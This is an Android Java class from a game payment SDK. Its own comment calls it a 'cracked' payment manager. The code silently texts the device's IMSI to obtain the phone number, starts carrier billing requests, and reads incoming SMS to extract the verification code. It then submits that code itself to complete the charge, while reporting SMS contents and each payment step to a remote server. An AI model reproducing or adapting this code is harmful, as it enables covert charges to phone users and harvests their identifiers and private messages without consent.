package mobi.zty.pay.sdk.yeYouFee;

import java.io.IOException;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class YeYouFeeInstance extends PaymentInterf{
	private static YeYouFeeInstance instance;
	private Handler callBHandler = null;
	private  String send_num = "106905114047";
	private String phoneNum;
	private int feeIndex;
	private  String vetif_vode = null;
	public static YeYouFeeInstance getInstance(){
		if(instance==null){
			instance = scyYeYoupay();
		}
		return instance;
	}
	private static synchronized YeYouFeeInstance scyYeYoupay(){
		if(instance==null){
			instance =  new YeYouFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
		
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String exdata = (String) parameters[0];
		feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "进入支付：", feeIndex);
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String partner = mkInfo.spIdentify;//合作方标识
		final String code = feeInfo.payCode;//产品编号
		final String  key1= mkInfo.spKey;//平台分配
		final String  key2= mkInfo.spKey2;//平台分配
		final String imsi = Helper.getIMSI(context);
		final String pay_url = mkInfo.payUrl1;//支付url
		phoneNum = GameSDK.getInstance().getPhoneNum();
		send_num = GameSDK.getInstance().getObtainNum();
		
		if (phoneNum==null||phoneNum.trim().equals("")) {
			Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "去获取手机号码", feeIndex);
			Intent itSend = new Intent(Constants.SENT_SMS_ACTION); 
			itSend.putExtra("fee_index", feeIndex);
	        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
	        Util_G.sendTextMessage(context, send_num, imsi, mSendPI, 0);//发这条短信给平台 是为了获取手机号码
	        
			Helper.httpGetPhonNum(GameSDK.getInstance().getNumUrl(), imsi, new Helper.Callback() {//轮询我们自己服务端获取手机号码
				
				@Override
				public void onResult(String info) {
					boolean SUCC = false;
					if (info!=null&&!info.trim().equals("")) {
						try {
							JSONObject resut = new JSONObject(info);
							String num = resut.getString("mobile_num");
							if (num!=null&&!num.equals("")) {
								SUCC = true;
								GameSDK.getInstance().setPhoneNum(num);
								phoneNum = num;
								Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "获取到手机号码", feeIndex);
								sendPayHttp(partner, code, key1,key2, pay_url,exdata);
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					if (!SUCC) {
						PayResultInfo info1 = new PayResultInfo();
						info1.resutCode = PayConfig.NO_PHONE_NUMBEL;
						info1.retMsg = "支付失败";
						Message message = callBHandler
								.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info1;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "获取手机号失败", feeIndex);
					}
				}
			});
		}else{
			sendPayHttp(partner, code, key1,key2, pay_url,exdata);	
		}
	}
	private void sendPayHttp(final String partner, final String pid,
			final String key1, final String key2,final String pay_url,final String exdata) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				try {
//						http://host:port/uri?method=ap&partner=1000&subcid=testsubcid&uid=**********
//							&pid=***&exdata=testorderid&key=2d466df68f24339be13dd0726a579ace
					String url1 = pay_url+"?method=ap"+"&partner="+partner
							+"&uid="+getUid(phoneNum)+"&pid="+pid+"&exdata="+exdata+"&key="+key1;//获取验证码的Url
					Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "执行支付请求："+url1, feeIndex);
					String vcResponse = request(url1);//{"CD":"1000","MSG":"success","OID":"130813010435325892"}
					boolean isSucc = false;
					if (vcResponse!=null&&vcResponse!="") {
						JSONObject result = new JSONObject(vcResponse);
						Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "拿到响应"+vcResponse, feeIndex);
						if (result!=null && result.getInt("CD")==1000) {//这个代表获取验证码成功
							String order = result.getString("OID");
							int step = 40;
							while (step>0) {
								step--;
								if (vetif_vode!=null) {//说明拿到了 验证码
//									http://host:port/uri?method=cp&partner=1000&order=2013071817165628
//										&verifycode=482657&key=f2f7fefb351aea1ee9bbe9557a21ab02
									String url2 = pay_url+"?method=cp"+"&partner="+partner
											+"&order="+order+"&verifycode="+vetif_vode+"&key="+key2;//获取验证码的Url
									vetif_vode = null;
									Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "发起提交验证码的请求"+url2, feeIndex);
									vcResponse = request(url2);//{"CD":"1000","MSG":"success","OID":"130813010435325892"}
									JSONObject result2 = new JSONObject(vcResponse);
									String order2 = result2.getString("OID");
									Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "发起提交验证码的响应"+vcResponse, feeIndex);
									if (result2!=null && result2.getInt("CD")==1000&&order.equals(order2)) {
										isSucc = true;
										info.resutCode = PayConfig.BIIL_SUCC;
										info.retMsg = "支付成功！";
										Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
										message.obj = info;
										message.sendToTarget();
										Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "提交验证码响应成功", feeIndex);
									}
									break;
								}
								Thread.sleep(1000);
							}
							
						}
					}  	
					if (!isSucc) {
						info.resutCode = PayConfig.SP_PAY_FAIL;
						info.retMsg = vcResponse;
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "cp响应回来失败"+vcResponse, feeIndex);
					}
				} catch (Exception e) {
					info.resutCode = PayConfig.SP_PAY_EXPTION;
					info.retMsg = "支付失败";
					Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					e.printStackTrace();
					Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "代码异常"+e.getMessage(), feeIndex);
				}
			
			}	
		}).start();;
	}
	
	/**
	 * 微米付通支付
	 */
	private String request(String url) {
		String result = null;
		HttpGet httpGet = new HttpGet(url);
		Util_G.debugE("YEyou支付的URL", url);
		DefaultHttpClient httpClient = new DefaultHttpClient();
		httpClient.getParams().setParameter(
				CoreConnectionPNames.CONNECTION_TIMEOUT, 15000);
		httpClient.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT,
				15000);
		try {
			HttpResponse httpResp = httpClient.execute(httpGet);
			if (httpResp.getStatusLine().getStatusCode() == 200) {
				result = EntityUtils.toString(httpResp.getEntity(), "UTF-8");
			} else {
				Util_G.debugE("httpGet", "httpGet方式请求失败");
			}
		} catch (ConnectTimeoutException e) {
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		Util_G.debugE("Yeyou支付情况：", result);
		return result;
	}
	private String getUid(String phoneNum){
		if (phoneNum == null) return "";
		String num = "";
		String sign[] = {"c","e","y","u","m","o","b","a","w","x"};
		int index = 0;
		while (index<phoneNum.trim().length()) {
			int index2 = Integer.parseInt(phoneNum.substring(index, index+1));
			num = num+sign[index2];
			index++;
		}
		
		return num;
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "读取到验证码短信："+content, feeIndex);
		GameSDK instance = GameSDK.getInstance();
		GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
		String vertifyNum = instance.mkMap.get(PayConfig.YEYOU_FEE).vertifyNum;
		Util_G.debugE("ALLPAY", "vertifyNum——》》" + vertifyNum
				+ "  content==>" + content);
		Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "判断验证码sendFrom="+sendFrom+"vertifyNum="+vertifyNum, feeIndex);
		if (sendFrom.contains(vertifyNum)&&groupFeeInfo!=null) {
			groupFeeInfo.getIntdexVerifyMap().put(feeIndex, 2);
			Util_G.debugE("ALLPAY", "vertifyNum——》》开始读取验证码");
			int startIndex = -1;
			int endIndex = 1;
			String munber = "0123456789";
			for (int i = 0; i < content.length(); i++) {
				String cr = content.charAt(i) + "";
				if (startIndex < 0 && munber.contains(cr)) {
					startIndex = i;
				} else if (startIndex >= 0
						&& !munber.contains(cr)) {
					endIndex = i;
					if (endIndex - startIndex < 6) {
						startIndex = -1;
						continue;
					} else {
						break;
					}
				}
			}
			vetif_vode = content.substring(startIndex,
					endIndex);
			if (vetif_vode==null) {
				Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "读取到验证码失败", feeIndex);
				return;
			}
			Helper.sendPayMessageToServer(PayConfig.YEYOU_FEE, "读取到验证码vertifyNum="+vertifyNum, feeIndex);
			Util_G.debugE("ALLPAY", "vertifyNum——》》"+vetif_vode);
		}
	
		super.sendVerifyCode(parameters);
	}
}
